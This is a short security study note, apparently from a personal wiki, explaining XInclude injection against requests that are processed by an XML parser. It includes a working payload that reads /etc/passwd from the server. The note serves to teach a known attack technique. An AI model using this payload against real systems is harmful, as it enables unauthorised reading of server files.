---
tags:
  - web
  - security
---
In cases where requests sent are not in XML format, but are processed by a XML processor, you can use [[XInclude]] to embed your own XML document to be processed.
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```